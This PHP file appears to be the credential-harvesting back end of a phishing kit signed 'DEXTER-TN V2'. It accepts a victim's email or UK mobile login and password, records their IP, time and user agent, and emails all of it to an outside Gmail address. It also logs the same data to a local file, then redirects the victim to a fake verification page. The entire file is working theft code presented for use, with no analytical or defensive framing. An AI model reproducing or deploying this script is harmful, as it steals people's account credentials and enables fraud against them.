<?php
session_start();
error_reporting(0);
function generateRandomString($length = 100) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$string = generateRandomString();
$sessionID = $_GET['sessionID'];
if(!isset($_SESSION['login'])){
    $email = $_POST['userLogin'];
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $_SESSION['email'] = $_POST['userLogin'];
        $_SESSION['login'] = $_POST['userLogin'];
        $_SESSION['password'] = $_POST['userPassword'];
    } 
    else {
        $pattern = "/^(\+44\s?7\d{3}|\(?07\d{3}\)?)\s?\d{3}\s?\d{3}$/";
        $input = $_POST['userLogin'];
        $match = preg_match($pattern,$input);
        if ($match != false) {
            $_SESSION['telephone'] = $_POST['userLogin'];
            $_SESSION['login'] = $_POST['userLogin'];
            $_SESSION['password'] = $_POST['userPassword'];
        } else {
            echo("<script>location.href = 'Login.php?sessionID=".$sessionID."&error=Login';</script>");
            exit();
        }
    }
}

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];
if(($_POST['userLogin'] != "") AND ($_POST['userPassword'] != ""))
{
$hostname = gethostbyaddr($ip);
$message .= "Coded by DEXTER-TN \n";
$message .= "################################ \n";
$message .= "Email       : ".$_POST['userLogin']."\n";
$message .= "Password    : ".$_POST['userPassword']."\n";
$message .= "################################ \n";
$message .= "IP:       $ip \n";
$message .= "Time:       $time \n";
$message .= "Agent:       $agent \n";
$message .= "################################ \n";
$message .= " DEXTER V2 \n";
$send = "dextertn216@gmail.com";
$subject = "Login From DEXTER-TN V2 $ip";
$headers = "From: DEXTER-TN V2<info@logs.com>";
mail($send,$subject,$message,$headers);
$MYFILE = "DEXTER/DEXTER-LOGINS.txt";
        $FH = @fopen($MYFILE, 'a+');
        @fwrite($FH, $message);
        @fclose($FH);
echo "<meta http-equiv='refresh' content='0; url=Verify.php?sessionID=$string.'/>";
}
    else {
     echo "<meta http-equiv='refresh' content='0; Verify.php?sessionID=20151313168168646sa77' />";
}

?>